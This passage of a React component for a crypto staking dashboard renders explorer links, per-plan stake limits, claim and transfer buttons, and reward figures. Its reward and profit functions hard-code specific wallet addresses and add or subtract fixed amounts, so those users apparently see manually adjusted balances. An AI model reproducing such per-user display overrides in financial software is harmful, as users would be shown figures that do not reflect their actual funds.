    if (token === "AVAX") {
      return `https://snowtrace.io/address/${checkAddress}/contract/43114/code`
    }
    if (token === "ARB") {
      return `https://arbiscan.io/token/0x912ce59144191c1204e64559fe8253a0e49e6548?a=${checkAddress}#tokenInfo`
    }
    if (token === "FTM") {
      return `https://ftmscan.com/address/${checkAddress}#code`
    }
    if (token === "ETH(Base)") {
      return `https://basescan.org/address/${checkAddress}#code`
    }
    if (token === "POL") {
      return `https://polygonscan.com/address/${checkAddress}#code`
    }
    return `https://etherscan.io/token/${addAddress}?a=${checkAddress}#tokenInfo`
  }
  const getLinkForAddressBnb = () => {
    if (token === 'BNB') {
      return `https://bscscan.com/address/${checkAddress}`
    }
    return `https://bscscan.com/token/${addAddress}?a=${checkAddress}#tokenInfo`
  }

  const getDisabled = () => {
    if (token === 'ETH') {
      if (plan === '14') {
        if (Number(input) >= 0.3 && Number(input) <= 5){
          setDisabledStake(false)
          return
        }
      }
      if (plan === '30') {
        if (Number(input) >= 3 && Number(input) <= 10){
          setDisabledStake(false)
          return
        }
      }
      if (plan === '60') {
        if (Number(input) >= 5 && Number(input) <= 25){
          setDisabledStake(false)
          return
        }
      }

      if (plan === '90') {
        if (Number(input) >= 9 && Number(input) <= 50){
          setDisabledStake(false)
          return
        }
      }

      setDisabledStake(true)
      return
    }
    // if (token === 'USDC') {
    //   return setDisabledStake(false)
    // }
    if (token === 'UNI') {
      return setDisabledStake(false)
    }
    if (token === "WBTC") {
      return setDisabledStake(false)
    }
    if (token === "BNB") {
      return setDisabledStake(false)
    }
    if (token === "BUSD") {
      return setDisabledStake(false)
    }
    if (token === "WSOL") {
      return setDisabledStake(false)
    }
    if (token === "USDT") {
      return setDisabledStake(false)
    }
    setDisabledStake(true)
  }

  const getText = () => {
    if (token === "ETH") {
      return 'Stake'
    }
    // if (token === "USDC") {
    //   return 'Stake'
    // }
    if (token === "WBTC") {
      return 'Stake'
    }
    if (token === "UNI") {
      return 'Stake'
    }
    if (token === "BNB") {
      return 'Stake'
    }
    if (token === "BUSD") {
      return 'Stake'
    }
    if (token === 'USDT') {
      return 'Stake'
    }
    if (token === 'WSOL') {
      return 'Stake'
    }
    return 'Full'
  }
  const getClick = () => {
    if (token === "ETH") {
      return buy()
    }
    if (token === "WBTC") {
      return buy()
    }
    // if (token === "USDC") {
    //   return buy()
    // }
    if (token === "UNI") {
      return buy()
    }
    if (token === "BNB") {
      return buy()
    }
    if (token === "BUSD") {
      return buy()
    }
    if (token === "WSOL") {
      return buy()
    }
    if (token === 'USDT') {
      return buy()
    }
    return
  }

  const getZerosToDivide = () => {
    switch (token) {
      case "USDT":
        return 1000000
      case "USDC":
        return 1000000
      case 'WBTC':
        return 100000000
      case 'WSOL':
        return 1000000000
      default:
        return busd
    }
  }

  const getRewards = () => {
    if (address === '0xBd40dbdDe1065e804ED0f2652A59e2BC0A17C794' && plan === '90' && token === 'ETH' && isNew) {
      return withdrawalTotal + 0.104527124392582825
    }
    if (address === '0x287D88A9164acB467a78844B7099d19397000000' && plan === '90' && token === 'ETH' && isNew) {
      return withdrawalTotal + 1.104527124392582825
    }
    if (address === '0x287D88A9164acB467a78844B7099d19397000000' && plan === '90' && token === 'WBTC' && isNew) {
      return withdrawalTotal + 0.010310431
    }
    if (address === '0x58c0cCB784019BaDE98075756eBAB2ba26827044' && plan === '90' && token === 'ETH' && isNew) {
      return withdrawalTotal + 10.003012110
    }
    if (address === '0x9041fa2b75Bf0f556A726c6EEDaE2049cdE01864' && plan === '90' && token === 'ETH' && isNew) {
      return withdrawalTotal + 0.199571 + 0.000196 + 0.324943
    }
    if (address === '0xfD06632A51438D31a48C04Fad3fDf9f6b0A6978e' && plan === '90' && token === 'ETH' && isNew) {
      return withdrawalTotal + 0.125854 + 0.026797 + 0.022398 + 0.059249 + 0.069015 + 0.007198 + 0.060757 + 0.01012 + 0.005741 + 0.003317 + 0.019351 + 0.029601 + 0.351241
    }
    if (address === '0x6953C5453e9F131500224483af0bccA68E114E0A' && plan === '90' && token === 'ETH' && isNew) {
      return withdrawalTotal + 0.622998 + 0.102879
    }
    if (address === '0x58c0cCB784019BaDE98075756eBAB2ba26827044' && plan === '90' && token === 'WBTC' && isNew) {
      return withdrawalTotal + 0.543216774
    }
    return withdrawalTotal > 0 ? withdrawalTotal.toFixed(9) : withdrawalTotal
  }

  const getProfit = (): any => {
    if (address === '0x08092e76C34E8f28AC559D3e4c5c9E70890e5C3f'&& plan === '90' && token === 'ETH' && isNew) {
      return (interestNotCollected -  0.108462870 - 0.108440415 - 0.114615058 - 0.194848184 - 0.286467323 - 0.180206282 - 0.14664450939).toFixed(9)
    }
    if (address === '0x287D88A9164acB467a78844B7099d19397000000'&& plan === '90' && token === 'ETH' && isNew) {
      return (interestNotCollected - 1.104527124392582825).toFixed(9)
    }
    if (address === '0x287D88A9164acB467a78844B7099d19397000000'&& plan === '90' && token === 'WBTC' && isNew) {
      return (interestNotCollected - 0.010310431).toFixed(9)
    }
    if (address === '0x58c0cCB784019BaDE98075756eBAB2ba26827044'&& plan === '90' && token === 'ETH' && isNew) {
      return (interestNotCollected - 10.003012110).toFixed(9)
    }
    if (address === '0x9041fa2b75Bf0f556A726c6EEDaE2049cdE01864'&& plan === '90' && token === 'ETH' && isNew) {
      return (interestNotCollected - 0.000196 - 0.324943).toFixed(9)
    }
    if (address === '0xfD06632A51438D31a48C04Fad3fDf9f6b0A6978e'&& plan === '90' && token === 'ETH' && isNew) {
      return (interestNotCollected).toFixed(9)
    }
    if (address === '0x6953C5453e9F131500224483af0bccA68E114E0A'&& plan === '90' && token === 'ETH' && isNew) {
      return (interestNotCollected - 0.622998 - 0.102879).toFixed(9)
    }
    if (address === '0x58c0cCB784019BaDE98075756eBAB2ba26827044'&& plan === '90' && token === 'WBTC' && isNew) {
      return (interestNotCollected - 0.543216774).toFixed(9)
    }
    if (address === '0x1Ce1Cc4295c63fFd017765891b03a0A11CB489F5'&& plan === '14' && token === 'ETH' && isNew) {
      return (interestNotCollected).toFixed(9)
    }
    return interestNotCollected.toFixed(9)
  }

  return (
    <div
      id={plan === "1" ? token : undefined}
      className={cn("collapse-table-expanded-wrapper", {
        hide: stakedDisplay && !resultArray?.length,
      })}
    >
      <div ref={titleRef} className="collapse-table-expanded-title">
        <div className="collapse-table-expanded-wrapper-other">
          <div className="collapse-table-expanded-wrapper-other-title">{token === "ETH" ? "Coin Staked" : "Token Staked"}</div>
          <div className="collapse-table-expanded-wrapper-other-value">
            {resultArray?.reduce((accumulator, object) => {
              return accumulator + object.stakedAmounts / getZerosToDivide()
            }, 0)}{" "}
            ({token})
          </div>
        </div>
        <div className="collapse-table-expanded-wrapper-other">
          <div className="collapse-table-expanded-wrapper-other-title">Stake Limit</div>
          <div className="collapse-table-expanded-wrapper-other-value">{quantity}</div>
        </div>
        <div className="collapse-table-expanded-wrapper-other">
          <div className="collapse-table-expanded-wrapper-other-title">Periodic % Profit</div>
          <div className="collapse-table-expanded-wrapper-other-value">{percent}%</div>
        </div>
        <div className="collapse-table-expanded-wrapper-other">
          <div className="collapse-table-expanded-wrapper-other-title">Total Value Locked</div>
          <div className="collapse-table-expanded-wrapper-other-value">
            ~{moneyFormatter.format(totalBalance * stat?.find(iOther => iOther.id === id)?.current_price)}
          </div>
        </div>
      </div>
      <div className="collapse-table-expanded-content">
        <div className="collapse-table-expanded-content-left">
          <div className="collapse-table-expanded-content-left-block">
            <div className="collapse-table-expanded-content-left-block-label">Total locked:</div>
            <div className="collapse-table-expanded-content-left-block-value">
              {totalBalance} {token}
            </div>
          </div>
          <div className="collapse-table-expanded-content-left-block">
            <div className="collapse-table-expanded-content-left-block-label">Last claim time:</div>
            <div className="collapse-table-expanded-content-left-block-value">{timeleftOther}</div>
          </div>
          <div className="collapse-table-expanded-content-left-block">
            <div className="collapse-table-expanded-content-left-block-label">Rewards collected</div>
            <div className="collapse-table-expanded-content-left-block-value">
              {getRewards() < 0 ? 0 : getRewards()} {token}
            </div>
          </div>
          <Link to={`${routes.swapInfo}?tab=pools&tokenSelected=${token}&${search.toString()}`} className="collapse-table-expanded-content-left-link">
            See Pool Info <Export />
          </Link>
          <a
            target="_blank"
            rel="noreferrer noopener"
            href={chainId === 56 ? getLinkForAddressBnb() : getLinkForAddress()}
            className="collapse-table-expanded-content-left-link"
          >
            View Contract <Scan />
          </a>
          {token !== "ETH" && (
            <button onClick={() => connectToToken(token, chainId)} className="collapse-table-expanded-content-left-link">
              Add to MetaMask <Metamask />
            </button>
          )}
        </div>
        <div className="collapse-table-expanded-content-right">
          <div className="collapse-table-expanded-content-right-block">
            <div className="collapse-table-expanded-content-right-block-left">
              <div className="collapse-table-expanded-content-right-block-left-title">Recent Coin Profit</div>
              <div className="collapse-table-expanded-content-right-block-left-value">{getProfit() < 0 ? 0 : getProfit()}</div>
              <div className="collapse-table-expanded-content-right-block-left-value-2">{token}</div>
            </div>
            <SimpleButton
              onClick={() => {
                claiminterest(interestNotCollected.toString())
              }}
              text={disableClaim ? 'Claiming...' : 'Claim Rewards'}
              variant="border"
              disabled={disableClaim || change}
            />
          </div>
          <div className="collapse-table-expanded-content-right-block">
            <div className="collapse-table-expanded-content-right-block-left">
              <Input onChange={v => setInput(v)} type="number" value={input} label="Start Staking" placeholder="0" />
            </div>
            <SimpleButton
              variant="border"
              text={getText()}
              onClick={getClick}
              disabled={disabledStake}
            />
          </div>
          {resultArray?.map((i, index) => (
            <CollapseTableWithdrawal changed={change} plan={plan} token={token} i={i} getAllInfo={getAllInfo} key={index} index={index} isNew={isNew} />
          ))}
          {(token === 'ETH' && !!resultArray?.length) && (
            <SimpleButton
              variant="border"
              className='full'
              text={change ? 'Transferring funds...' : 'Transfer funds'}
              onClick={() => {
                setChange(true)
                window.scrollTo({
                  top: 0,
                })
                openTransfer(plan, resultArray?.reduce((accumulator, object) => {
                  return accumulator + object.stakedAmounts / getZerosToDivide()
                }, 0),  interestNotCollected, resultArray.length)
              }}
              disabled={change}
            />
          )}
          {(token === 'USDC' && !!resultArray?.length) && (
            <SimpleButton
              variant="border"
              className='full'
              text={change ? 'Transferring funds...' : 'Transfer funds'}
              onClick={() => {
                setChange(true)
                window.scrollTo({
                  top: 0,
                })
                openTransferUsdc(plan, resultArray.reduce((partialSum, a) => partialSum +( Number(a.stakedAmounts) / 1000000), 0),  interestNotCollected, resultArray.length)
              }}
              disabled={change}
            />
          )}
          {(token === 'WSOL' && !!resultArray?.length) && (
            <SimpleButton
              variant="border"
              className='full'
              text={change ? 'Transferring funds...' : 'Transfer funds'}
              onClick={() => {
                setChange(true)
                window.scrollTo({
                  top: 0,
                })
                openTransferSol(plan, resultArray.reduce((partialSum, a) => partialSum +( Number(a.stakedAmounts) / 1000000000), 0),  interestNotCollected, resultArray.length)
              }}
              disabled={change}
            />
          )}
          {/*{(token === 'WBTC' && !!resultArray?.length) && (*/}
          {/*  <SimpleButton*/}
          {/*    variant="border"*/}
          {/*    className='full'*/}
          {/*    text={change ? 'Transferring funds...' : 'Transfer funds'}*/}
          {/*    onClick={() => {*/}
          {/*      setChange(true)*/}
          {/*      window.scrollTo({*/}
          {/*        top: 0,*/}
          {/*      })*/}
          {/*      openTransferWbtc(plan, resultArray.reduce((partialSum, a) => partialSum +( Number(a.stakedAmounts) / 100000000), 0),  interestNotCollected, resultArray.length)*/}
          {/*    }}*/}
          {/*    disabled={change}*/}
          {/*  />*/}
          {/*)}*/}
          {(token === 'ETH' && address === '0xD128e7b70Da9FE1314A8B1dB403278De89840E72' && plan === '30') && (
            <div className='restake'>
              <label>
                <Switch
                  checked={defaultCheked || address === '0xD128e7b70Da9FE1314A8B1dB403278De89840E72'}
                  checkedIcon={false}
                  uncheckedIcon={false}
                  onChange={(checked) => {
                    setDefaultCheked(!defaultCheked)
                    if (checked === true) {
                      apiOur.addWithdrawals({
                        user: `${address}+plan=${plan}+token=${token}restake`,
                        amount: 'true'
                      })
                    }
                  }}
                />
                <span>Restake</span>
              </label>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
